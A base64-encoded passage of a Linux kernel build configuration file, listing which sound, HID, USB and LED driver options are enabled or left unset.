IGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0lORElHT0lPIGlzIG5vdCBzZXQKIyBDT05GSUdfU05E
X0lORElHT0RKIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0lORElHT0lPWCBpcyBub3Qgc2V0CiMg
Q09ORklHX1NORF9JTkRJR09ESlggaXMgbm90IHNldAojIENPTkZJR19TTkRfRU1VMTBLMSBpcyBu
b3Qgc2V0CiMgQ09ORklHX1NORF9FTVUxMEsxWCBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9FTlMx
MzcwIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0VOUzEzNzEgaXMgbm90IHNldAojIENPTkZJR19T
TkRfRVMxOTM4IGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0VTMTk2OCBpcyBub3Qgc2V0CiMgQ09O
RklHX1NORF9GTTgwMSBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9IRFNQIGlzIG5vdCBzZXQKIyBD
T05GSUdfU05EX0hEU1BNIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0lDRTE3MTIgaXMgbm90IHNl
dAojIENPTkZJR19TTkRfSUNFMTcyNCBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9JTlRFTDhYMCBp
cyBub3Qgc2V0CiMgQ09ORklHX1NORF9JTlRFTDhYME0gaXMgbm90IHNldAojIENPTkZJR19TTkRf
S09SRzEyMTIgaXMgbm90IHNldAojIENPTkZJR19TTkRfTE9MQSBpcyBub3Qgc2V0CiMgQ09ORklH
X1NORF9MWDY0NjRFUyBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9NQUVTVFJPMyBpcyBub3Qgc2V0
CiMgQ09ORklHX1NORF9NSVhBUlQgaXMgbm90IHNldAojIENPTkZJR19TTkRfTk0yNTYgaXMgbm90
IHNldAojIENPTkZJR19TTkRfUENYSFIgaXMgbm90IHNldAojIENPTkZJR19TTkRfUklQVElERSBp
cyBub3Qgc2V0CiMgQ09ORklHX1NORF9STUUzMiBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9STUU5
NiBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9STUU5NjUyIGlzIG5vdCBzZXQKIyBDT05GSUdfU05E
X1NFNlggaXMgbm90IHNldAojIENPTkZJR19TTkRfU09OSUNWSUJFUyBpcyBub3Qgc2V0CiMgQ09O
RklHX1NORF9UUklERU5UIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX1ZJQTgyWFggaXMgbm90IHNl
dAojIENPTkZJR19TTkRfVklBODJYWF9NT0RFTSBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9WSVJU
VU9TTyBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9WWDIyMiBpcyBub3Qgc2V0CiMgQ09ORklHX1NO
RF9ZTUZQQ0kgaXMgbm90IHNldAoKIwojIEhELUF1ZGlvCiMKQ09ORklHX1NORF9IREE9eQpDT05G
SUdfU05EX0hEQV9JTlRFTD15CkNPTkZJR19TTkRfSERBX0hXREVQPXkKIyBDT05GSUdfU05EX0hE
QV9SRUNPTkZJRyBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9IREFfSU5QVVRfQkVFUCBpcyBub3Qg
c2V0CiMgQ09ORklHX1NORF9IREFfUEFUQ0hfTE9BREVSIGlzIG5vdCBzZXQKIyBDT05GSUdfU05E
X0hEQV9DT0RFQ19SRUFMVEVLIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0hEQV9DT0RFQ19BTkFM
T0cgaXMgbm90IHNldAojIENPTkZJR19TTkRfSERBX0NPREVDX1NJR01BVEVMIGlzIG5vdCBzZXQK
IyBDT05GSUdfU05EX0hEQV9DT0RFQ19WSUEgaXMgbm90IHNldAojIENPTkZJR19TTkRfSERBX0NP
REVDX0hETUkgaXMgbm90IHNldAojIENPTkZJR19TTkRfSERBX0NPREVDX0NJUlJVUyBpcyBub3Qg
c2V0CiMgQ09ORklHX1NORF9IREFfQ09ERUNfQ1M4NDA5IGlzIG5vdCBzZXQKIyBDT05GSUdfU05E
X0hEQV9DT0RFQ19DT05FWEFOVCBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9IREFfQ09ERUNfU0VO
QVJZVEVDSCBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9IREFfQ09ERUNfQ0EwMTEwIGlzIG5vdCBz
ZXQKIyBDT05GSUdfU05EX0hEQV9DT0RFQ19DQTAxMzIgaXMgbm90IHNldAojIENPTkZJR19TTkRf
SERBX0NPREVDX0NNRURJQSBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9IREFfQ09ERUNfU0kzMDU0
IGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0hEQV9HRU5FUklDIGlzIG5vdCBzZXQKQ09ORklHX1NO
RF9IREFfUE9XRVJfU0FWRV9ERUZBVUxUPTAKIyBDT05GSUdfU05EX0hEQV9JTlRFTF9IRE1JX1NJ
TEVOVF9TVFJFQU0gaXMgbm90IHNldAojIENPTkZJR19TTkRfSERBX0NUTF9ERVZfSUQgaXMgbm90
IHNldAojIGVuZCBvZiBIRC1BdWRpbwoKQ09ORklHX1NORF9IREFfQ09SRT15CkNPTkZJR19TTkRf
SERBX0NPTVBPTkVOVD15CkNPTkZJR19TTkRfSERBX0k5MTU9eQpDT05GSUdfU05EX0hEQV9QUkVB
TExPQ19TSVpFPTAKQ09ORklHX1NORF9JTlRFTF9OSExUPXkKQ09ORklHX1NORF9JTlRFTF9EU1Bf
Q09ORklHPXkKQ09ORklHX1NORF9JTlRFTF9TT1VORFdJUkVfQUNQST15CkNPTkZJR19TTkRfVVNC
PXkKIyBDT05GSUdfU05EX1VTQl9BVURJTyBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9VU0JfVUEx
MDEgaXMgbm90IHNldAojIENPTkZJR19TTkRfVVNCX1VTWDJZIGlzIG5vdCBzZXQKIyBDT05GSUdf
U05EX1VTQl9DQUlBUSBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9VU0JfVVMxMjJMIGlzIG5vdCBz
ZXQKIyBDT05GSUdfU05EX1VTQl82RklSRSBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9VU0JfSElG
QUNFIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0JDRDIwMDAgaXMgbm90IHNldAojIENPTkZJR19T
TkRfVVNCX1BPRCBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9VU0JfUE9ESEQgaXMgbm90IHNldAoj
IENPTkZJR19TTkRfVVNCX1RPTkVQT1JUIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX1VTQl9WQVJJ
QVggaXMgbm90IHNldApDT05GSUdfU05EX1BDTUNJQT15CiMgQ09ORklHX1NORF9WWFBPQ0tFVCBp
cyBub3Qgc2V0CiMgQ09ORklHX1NORF9QREFVRElPQ0YgaXMgbm90IHNldAojIENPTkZJR19TTkRf
U09DIGlzIG5vdCBzZXQKQ09ORklHX1NORF9YODY9eQojIENPTkZJR19IRE1JX0xQRV9BVURJTyBp
cyBub3Qgc2V0CiMgQ09ORklHX1NORF9WSVJUSU8gaXMgbm90IHNldApDT05GSUdfSElEX1NVUFBP
UlQ9eQpDT05GSUdfSElEPXkKIyBDT05GSUdfSElEX0JBVFRFUllfU1RSRU5HVEggaXMgbm90IHNl
dApDT05GSUdfSElEUkFXPXkKIyBDT05GSUdfVUhJRCBpcyBub3Qgc2V0CkNPTkZJR19ISURfR0VO
RVJJQz15CgojCiMgU3BlY2lhbCBISUQgZHJpdmVycwojCkNPTkZJR19ISURfQTRURUNIPXkKIyBD
T05GSUdfSElEX0FDQ1VUT1VDSCBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9BQ1JVWCBpcyBub3Qg
c2V0CkNPTkZJR19ISURfQVBQTEU9eQojIENPTkZJR19ISURfQVBQTEVJUiBpcyBub3Qgc2V0CiMg
Q09ORklHX0hJRF9BU1VTIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX0FVUkVBTCBpcyBub3Qgc2V0
CkNPTkZJR19ISURfQkVMS0lOPXkKIyBDT05GSUdfSElEX0JFVE9QX0ZGIGlzIG5vdCBzZXQKIyBD
T05GSUdfSElEX0JJR0JFTl9GRiBpcyBub3Qgc2V0CkNPTkZJR19ISURfQ0hFUlJZPXkKQ09ORklH
X0hJRF9DSElDT05ZPXkKIyBDT05GSUdfSElEX0NPUlNBSVIgaXMgbm90IHNldAojIENPTkZJR19I
SURfQ09VR0FSIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX01BQ0FMTFkgaXMgbm90IHNldAojIENP
TkZJR19ISURfUFJPRElLRVlTIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX0NNRURJQSBpcyBub3Qg
c2V0CiMgQ09ORklHX0hJRF9DUkVBVElWRV9TQjA1NDAgaXMgbm90IHNldApDT05GSUdfSElEX0NZ
UFJFU1M9eQojIENPTkZJR19ISURfRFJBR09OUklTRSBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9F
TVNfRkYgaXMgbm90IHNldAojIENPTkZJR19ISURfRUxBTiBpcyBub3Qgc2V0CiMgQ09ORklHX0hJ
RF9FTEVDT00gaXMgbm90IHNldAojIENPTkZJR19ISURfRUxPIGlzIG5vdCBzZXQKIyBDT05GSUdf
SElEX0VWSVNJT04gaXMgbm90IHNldApDT05GSUdfSElEX0VaS0VZPXkKIyBDT05GSUdfSElEX0ZU
MjYwIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX0dFTUJJUkQgaXMgbm90IHNldAojIENPTkZJR19I
SURfR0ZSTSBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9HTE9SSU9VUyBpcyBub3Qgc2V0CiMgQ09O
RklHX0hJRF9IT0xURUsgaXMgbm90IHNldAojIENPTkZJR19ISURfR09PR0xFX1NUQURJQV9GRiBp
cyBub3Qgc2V0CiMgQ09ORklHX0hJRF9WSVZBTERJIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX0dU
NjgzUiBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9LRVlUT1VDSCBpcyBub3Qgc2V0CiMgQ09ORklH
X0hJRF9LWUUgaXMgbm90IHNldAojIENPTkZJR19ISURfVUNMT0dJQyBpcyBub3Qgc2V0CiMgQ09O
RklHX0hJRF9XQUxUT1AgaXMgbm90IHNldAojIENPTkZJR19ISURfVklFV1NPTklDIGlzIG5vdCBz
ZXQKIyBDT05GSUdfSElEX1ZSQzIgaXMgbm90IHNldAojIENPTkZJR19ISURfWElBT01JIGlzIG5v
dCBzZXQKQ09ORklHX0hJRF9HWVJBVElPTj15CiMgQ09ORklHX0hJRF9JQ0FERSBpcyBub3Qgc2V0
CkNPTkZJR19ISURfSVRFPXkKIyBDT05GSUdfSElEX0pBQlJBIGlzIG5vdCBzZXQKIyBDT05GSUdf
SElEX1RXSU5IQU4gaXMgbm90IHNldApDT05GSUdfSElEX0tFTlNJTkdUT049eQojIENPTkZJR19I
SURfTENQT1dFUiBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9MRUQgaXMgbm90IHNldAojIENPTkZJ
R19ISURfTEVOT1ZPIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX0xFVFNLRVRDSCBpcyBub3Qgc2V0
CkNPTkZJR19ISURfTE9HSVRFQ0g9eQojIENPTkZJR19ISURfTE9HSVRFQ0hfREogaXMgbm90IHNl
dAojIENPTkZJR19ISURfTE9HSVRFQ0hfSElEUFAgaXMgbm90IHNldApDT05GSUdfTE9HSVRFQ0hf
RkY9eQojIENPTkZJR19MT0dJUlVNQkxFUEFEMl9GRiBpcyBub3Qgc2V0CiMgQ09ORklHX0xPR0lH
OTQwX0ZGIGlzIG5vdCBzZXQKQ09ORklHX0xPR0lXSEVFTFNfRkY9eQojIENPTkZJR19ISURfTUFH
SUNNT1VTRSBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9NQUxUUk9OIGlzIG5vdCBzZXQKIyBDT05G
SUdfSElEX01BWUZMQVNIIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX01FR0FXT1JMRF9GRiBpcyBu
b3Qgc2V0CkNPTkZJR19ISURfUkVEUkFHT049eQpDT05GSUdfSElEX01JQ1JPU09GVD15CkNPTkZJ
R19ISURfTU9OVEVSRVk9eQojIENPTkZJR19ISURfTVVMVElUT1VDSCBpcyBub3Qgc2V0CiMgQ09O
RklHX0hJRF9OSU5URU5ETyBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9OVEkgaXMgbm90IHNldApD
T05GSUdfSElEX05UUklHPXkKIyBDT05GSUdfSElEX09SVEVLIGlzIG5vdCBzZXQKQ09ORklHX0hJ
RF9QQU5USEVSTE9SRD15CkNPTkZJR19QQU5USEVSTE9SRF9GRj15CiMgQ09ORklHX0hJRF9QRU5N
T1VOVCBpcyBub3Qgc2V0CkNPTkZJR19ISURfUEVUQUxZTlg9eQojIENPTkZJR19ISURfUElDT0xD
RCBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9QTEFOVFJPTklDUyBpcyBub3Qgc2V0CiMgQ09ORklH
X0hJRF9QWFJDIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX1JBWkVSIGlzIG5vdCBzZXQKIyBDT05G
SUdfSElEX1BSSU1BWCBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9SRVRST0RFIGlzIG5vdCBzZXQK
IyBDT05GSUdfSElEX1JPQ0NBVCBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9TQUlURUsgaXMgbm90
IHNldApDT05GSUdfSElEX1NBTVNVTkc9eQojIENPTkZJR19ISURfU0VNSVRFSyBpcyBub3Qgc2V0
CiMgQ09ORklHX0hJRF9TSUdNQU1JQ1JPIGlzIG5vdCBzZXQKQ09ORklHX0hJRF9TT05ZPXkKIyBD
T05GSUdfU09OWV9GRiBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9TUEVFRExJTksgaXMgbm90IHNl
dAojIENPTkZJR19ISURfU1RFQU0gaXMgbm90IHNldAojIENPTkZJR19ISURfU1RFRUxTRVJJRVMg
aXMgbm90IHNldApDT05GSUdfSElEX1NVTlBMVVM9eQojIENPTkZJR19ISURfUk1JIGlzIG5vdCBz
ZXQKIyBDT05GSUdfSElEX0dSRUVOQVNJQSBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9TTUFSVEpP
WVBMVVMgaXMgbm90IHNldAojIENPTkZJR19ISURfVElWTyBpcyBub3Qgc2V0CkNPTkZJR19ISURf
VE9QU0VFRD15CiMgQ09ORklHX0hJRF9UT1BSRSBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9USElO
R00gaXMgbm90IHNldAojIENPTkZJR19ISURfVEhSVVNUTUFTVEVSIGlzIG5vdCBzZXQKIyBDT05G
SUdfSElEX1VEUkFXX1BTMyBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9VMkZaRVJPIGlzIG5vdCBz
ZXQKIyBDT05GSUdfSElEX1dBQ09NIGlzIG5vdCBzZXQKIyBDT05GSUdfSElEX1dJSU1PVEUgaXMg
bm90IHNldAojIENPTkZJR19ISURfV0lOV0lORyBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9YSU5N
TyBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9aRVJPUExVUyBpcyBub3Qgc2V0CiMgQ09ORklHX0hJ
RF9aWURBQ1JPTiBpcyBub3Qgc2V0CiMgQ09ORklHX0hJRF9TRU5TT1JfSFVCIGlzIG5vdCBzZXQK
IyBDT05GSUdfSElEX0FMUFMgaXMgbm90IHNldAojIENPTkZJR19ISURfTUNQMjIyMSBpcyBub3Qg
c2V0CiMgZW5kIG9mIFNwZWNpYWwgSElEIGRyaXZlcnMKCiMKIyBISUQtQlBGIHN1cHBvcnQKIwoj
IGVuZCBvZiBISUQtQlBGIHN1cHBvcnQKCiMKIyBVU0IgSElEIHN1cHBvcnQKIwpDT05GSUdfVVNC
X0hJRD15CkNPTkZJR19ISURfUElEPXkKQ09ORklHX1VTQl9ISURERVY9eQojIGVuZCBvZiBVU0Ig
SElEIHN1cHBvcnQKCkNPTkZJR19JMkNfSElEPXkKIyBDT05GSUdfSTJDX0hJRF9BQ1BJIGlzIG5v
dCBzZXQKIyBDT05GSUdfSTJDX0hJRF9PRiBpcyBub3Qgc2V0CgojCiMgSW50ZWwgSVNIIEhJRCBz
dXBwb3J0CiMKIyBDT05GSUdfSU5URUxfSVNIX0hJRCBpcyBub3Qgc2V0CiMgZW5kIG9mIEludGVs
IElTSCBISUQgc3VwcG9ydAoKIwojIEFNRCBTRkggSElEIFN1cHBvcnQKIwojIENPTkZJR19BTURf
U0ZIX0hJRCBpcyBub3Qgc2V0CiMgZW5kIG9mIEFNRCBTRkggSElEIFN1cHBvcnQKCkNPTkZJR19V
U0JfT0hDSV9MSVRUTEVfRU5ESUFOPXkKQ09ORklHX1VTQl9TVVBQT1JUPXkKQ09ORklHX1VTQl9D
T01NT049eQojIENPTkZJR19VU0JfTEVEX1RSSUcgaXMgbm90IHNldAojIENPTkZJR19VU0JfVUxQ
SV9CVVMgaXMgbm90IHNldApDT05GSUdfVVNCX0FSQ0hfSEFTX0hDRD15CkNPTkZJR19VU0I9eQpD
T05GSUdfVVNCX1BDST15CkNPTkZJR19VU0JfUENJX0FNRD15CkNPTkZJR19VU0JfQU5OT1VOQ0Vf
TkVXX0RFVklDRVM9eQoKIwojIE1pc2NlbGxhbmVvdXMgVVNCIG9wdGlvbnMKIwpDT05GSUdfVVNC
X0RFRkFVTFRfUEVSU0lTVD15CiMgQ09ORklHX1VTQl9GRVdfSU5JVF9SRVRSSUVTIGlzIG5vdCBz
ZXQKIyBDT05GSUdfVVNCX0RZTkFNSUNfTUlOT1JTIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX09U
RyBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9PVEdfUFJPRFVDVExJU1QgaXMgbm90IHNldAojIENP
TkZJR19VU0JfTEVEU19UUklHR0VSX1VTQlBPUlQgaXMgbm90IHNldApDT05GSUdfVVNCX0FVVE9T
VVNQRU5EX0RFTEFZPTIKQ09ORklHX1VTQl9ERUZBVUxUX0FVVEhPUklaQVRJT05fTU9ERT0xCkNP
TkZJR19VU0JfTU9OPXkKCiMKIyBVU0IgSG9zdCBDb250cm9sbGVyIERyaXZlcnMKIwojIENPTkZJ
R19VU0JfQzY3WDAwX0hDRCBpcyBub3Qgc2V0CkNPTkZJR19VU0JfWEhDSV9IQ0Q9eQojIENPTkZJ
R19VU0JfWEhDSV9EQkdDQVAgaXMgbm90IHNldApDT05GSUdfVVNCX1hIQ0lfUENJPXkKIyBDT05G
SUdfVVNCX1hIQ0lfUENJX1JFTkVTQVMgaXMgbm90IHNldAojIENPTkZJR19VU0JfWEhDSV9QTEFU
Rk9STSBpcyBub3Qgc2V0CkNPTkZJR19VU0JfRUhDSV9IQ0Q9eQojIENPTkZJR19VU0JfRUhDSV9S
T09UX0hVQl9UVCBpcyBub3Qgc2V0CkNPTkZJR19VU0JfRUhDSV9UVF9ORVdTQ0hFRD15CkNPTkZJ
R19VU0JfRUhDSV9QQ0k9eQojIENPTkZJR19VU0JfRUhDSV9GU0wgaXMgbm90IHNldAojIENPTkZJ
R19VU0JfRUhDSV9IQ0RfUExBVEZPUk0gaXMgbm90IHNldAojIENPTkZJR19VU0JfT1hVMjEwSFBf
SENEIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX0lTUDExNlhfSENEIGlzIG5vdCBzZXQKQ09ORklH
X1VTQl9PSENJX0hDRD15CkNPTkZJR19VU0JfT0hDSV9IQ0RfUENJPXkKIyBDT05GSUdfVVNCX09I
Q0lfSENEX1BMQVRGT1JNIGlzIG5vdCBzZXQKQ09ORklHX1VTQl9VSENJX0hDRD15CiMgQ09ORklH
X1VTQl9TTDgxMV9IQ0QgaXMgbm90IHNldAojIENPTkZJR19VU0JfUjhBNjY1OTdfSENEIGlzIG5v
dCBzZXQKIyBDT05GSUdfVVNCX0hDRF9URVNUX01PREUgaXMgbm90IHNldAoKIwojIFVTQiBEZXZp
Y2UgQ2xhc3MgZHJpdmVycwojCiMgQ09ORklHX1VTQl9BQ00gaXMgbm90IHNldApDT05GSUdfVVNC
X1BSSU5URVI9eQojIENPTkZJR19VU0JfV0RNIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX1RNQyBp
cyBub3Qgc2V0CgojCiMgTk9URTogVVNCX1NUT1JBR0UgZGVwZW5kcyBvbiBTQ1NJIGJ1dCBCTEtf
REVWX1NEIG1heQojCgojCiMgYWxzbyBiZSBuZWVkZWQ7IHNlZSBVU0JfU1RPUkFHRSBIZWxwIGZv
ciBtb3JlIGluZm8KIwpDT05GSUdfVVNCX1NUT1JBR0U9eQojIENPTkZJR19VU0JfU1RPUkFHRV9E
RUJVRyBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9TVE9SQUdFX1JFQUxURUsgaXMgbm90IHNldAoj
IENPTkZJR19VU0JfU1RPUkFHRV9EQVRBRkFCIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX1NUT1JB
R0VfRlJFRUNPTSBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9TVE9SQUdFX0lTRDIwMCBpcyBub3Qg
c2V0CiMgQ09ORklHX1VTQl9TVE9SQUdFX1VTQkFUIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX1NU
T1JBR0VfU0REUjA5IGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX1NUT1JBR0VfU0REUjU1IGlzIG5v
dCBzZXQKIyBDT05GSUdfVVNCX1NUT1JBR0VfSlVNUFNIT1QgaXMgbm90IHNldAojIENPTkZJR19V
U0JfU1RPUkFHRV9BTEFVREEgaXMgbm90IHNldAojIENPTkZJR19VU0JfU1RPUkFHRV9PTkVUT1VD
SCBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9TVE9SQUdFX0tBUk1BIGlzIG5vdCBzZXQKIyBDT05G
SUdfVVNCX1NUT1JBR0VfQ1lQUkVTU19BVEFDQiBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9TVE9S
QUdFX0VORV9VQjYyNTAgaXMgbm90IHNldAojIENPTkZJR19VU0JfVUFTIGlzIG5vdCBzZXQKCiMK
IyBVU0IgSW1hZ2luZyBkZXZpY2VzCiMKIyBDT05GSUdfVVNCX01EQzgwMCBpcyBub3Qgc2V0CiMg
Q09ORklHX1VTQl9NSUNST1RFSyBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQklQX0NPUkUgaXMgbm90
IHNldAoKIwojIFVTQiBkdWFsLW1vZGUgY29udHJvbGxlciBkcml2ZXJzCiMKIyBDT05GSUdfVVNC
X0NETlNfU1VQUE9SVCBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9NVVNCX0hEUkMgaXMgbm90IHNl
dAojIENPTkZJR19VU0JfRFdDMyBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9EV0MyIGlzIG5vdCBz
ZXQKIyBDT05GSUdfVVNCX0NISVBJREVBIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX0lTUDE3NjAg
aXMgbm90IHNldAoKIwojIFVTQiBwb3J0IGRyaXZlcnMKIwojIENPTkZJR19VU0JfU0VSSUFMIGlz
IG5vdCBzZXQKCiMKIyBVU0IgTWlzY2VsbGFuZW91cyBkcml2ZXJzCiMKIyBDT05GSUdfVVNCX0VN
STYyIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX0VNSTI2IGlzIG5vdCBzZXQKIyBDT05GSUdfVVNC
X0FEVVRVWCBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9TRVZTRUcgaXMgbm90IHNldAojIENPTkZJ
R19VU0JfTEVHT1RPV0VSIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX0xDRCBpcyBub3Qgc2V0CiMg
Q09ORklHX1VTQl9DWVBSRVNTX0NZN0M2MyBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9DWVRIRVJN
IGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX0lETU9VU0UgaXMgbm90IHNldAojIENPTkZJR19VU0Jf
QVBQTEVESVNQTEFZIGlzIG5vdCBzZXQKIyBDT05GSUdfQVBQTEVfTUZJX0ZBU1RDSEFSR0UgaXMg
bm90IHNldAojIENPTkZJR19VU0JfTEpDQSBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9TSVNVU0JW
R0EgaXMgbm90IHNldAojIENPTkZJR19VU0JfTEQgaXMgbm90IHNldAojIENPTkZJR19VU0JfVFJB
TkNFVklCUkFUT1IgaXMgbm90IHNldAojIENPTkZJR19VU0JfSU9XQVJSSU9SIGlzIG5vdCBzZXQK
IyBDT05GSUdfVVNCX1RFU1QgaXMgbm90IHNldAojIENPTkZJR19VU0JfRUhTRVRfVEVTVF9GSVhU
VVJFIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX0lTSUdIVEZXIGlzIG5vdCBzZXQKIyBDT05GSUdf
VVNCX1lVUkVYIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX0VaVVNCX0ZYMiBpcyBub3Qgc2V0CiMg
Q09ORklHX1VTQl9IVUJfVVNCMjUxWEIgaXMgbm90IHNldAojIENPTkZJR19VU0JfSFNJQ19VU0Iz
NTAzIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNCX0hTSUNfVVNCNDYwNCBpcyBub3Qgc2V0CiMgQ09O
RklHX1VTQl9MSU5LX0xBWUVSX1RFU1QgaXMgbm90IHNldAojIENPTkZJR19VU0JfQ0hBT1NLRVkg
aXMgbm90IHNldAoKIwojIFVTQiBQaHlzaWNhbCBMYXllciBkcml2ZXJzCiMKIyBDT05GSUdfTk9Q
X1VTQl9YQ0VJViBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9JU1AxMzAxIGlzIG5vdCBzZXQKIyBl
bmQgb2YgVVNCIFBoeXNpY2FsIExheWVyIGRyaXZlcnMKCiMgQ09ORklHX1VTQl9HQURHRVQgaXMg
bm90IHNldAojIENPTkZJR19UWVBFQyBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9ST0xFX1NXSVRD
SCBpcyBub3Qgc2V0CiMgQ09ORklHX01NQyBpcyBub3Qgc2V0CiMgQ09ORklHX1NDU0lfVUZTSENE
IGlzIG5vdCBzZXQKIyBDT05GSUdfTUVNU1RJQ0sgaXMgbm90IHNldApDT05GSUdfTkVXX0xFRFM9
eQpDT05GSUdfTEVEU19DTEFTUz15CiMgQ09ORklHX0xFRFNfQ0xBU1NfRkxBU0ggaXMgbm90IHNl
dAojIENPTkZJR19MRURTX0NMQVNTX01VTFRJQ09MT1IgaXMgbm90IHNldAojIENPTkZJR19MRURT
X0JSSUdIVE5FU1NfSFdfQ0hBTkdFRCBpcyBub3Qgc2V0CgojCiMgTEVEIGRyaXZlcnMKIwojIENP
TkZJR19MRURTX0FQVSBpcyBub3Qgc2V0CiMgQ09ORklHX0xFRFNfQVcyMDBYWCBpcyBub3Qgc2V0
CiMgQ09ORklHX0xFRFNfTE0zNTMwIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVEU19MTTM1MzIgaXMg
bm90IHNldAojIENPTkZJR19MRURTX0xNMzY0MiBpcyBub3Qgc2V0CiMgQ09ORklHX0xFRFNfUENB
OTUzMiBpcyBub3Qgc2V0CiMgQ09ORklHX0xFRFNfTFAzOTQ0IGlzIG5vdCBzZXQKIyBDT05GSUdf
TEVEU19QQ0E5NTVYIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVEU19QQ0E5NjNYIGlzIG5vdCBzZXQK
IyBDT05GSUdfTEVEU19QQ0E5OTVYIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVEU19CRDI2MDZNVlYg
aXMgbm90IHNldAojIENPTkZJR19MRURTX0JEMjgwMiBpcyBub3Qgc2V0CiMgQ09ORklHX0xFRFNf
SU5URUxfU1M0MjAwIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVEU19UQ0E2NTA3IGlzIG5vdCBzZXQK
IyBDT05GSUdfTEVEU19UTEM1OTFYWCBpcyBub3Qgc2V0CiMgQ09ORklHX0xFRFNfTE0zNTV4IGlz
IG5vdCBzZXQKIyBDT05GSUdfTEVEU19JUzMxRkwzMTlYIGlzIG5vdCBzZXQKCiMKIyBMRUQgZHJp
dmVyIGZvciBibGluaygxKSBVU0IgUkdCIExFRCBpcyB1bmRlciBTcGVjaWFsIEhJRCBkcml2ZXJz
IChISURfVEhJTkdNKQojCiMgQ09ORklHX0xFRFNfQkxJTktNIGlzIG5vdCBzZXQKIyBDT05GSUdf
TEVEU19NTFhDUExEIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVEU19NTFhSRUcgaXMgbm90IHNldAoj
IENPTkZJR19MRURTX1VTRVIgaXMgbm90IHNldAojIENPTkZJR19MRURTX05JQzc4QlggaXMgbm90
IHNldAoKIwojIEZsYXNoIGFuZCBUb3JjaCBMRUQgZHJpdmVycwojCgojCiMgUkdCIExFRCBkcml2
ZXJzCiMKCiMKIyBMRUQgVHJpZ2dlcnMKIwpDT05GSUdfTEVEU19UUklHR0VSUz15CiMgQ09ORklH
X0xFRFNfVFJJR0dFUl9USU1FUiBpcyBub3Qgc2V0CiMgQ09ORklHX0xFRFNfVFJJR0dFUl9PTkVT
SE9UIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVEU19UUklHR0VSX0RJU0sgaXMgbm90IHNldAojIENP
TkZJR19MRURTX1RSSUdHRVJfSEVBUlRCRUFUIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVEU19UUklH
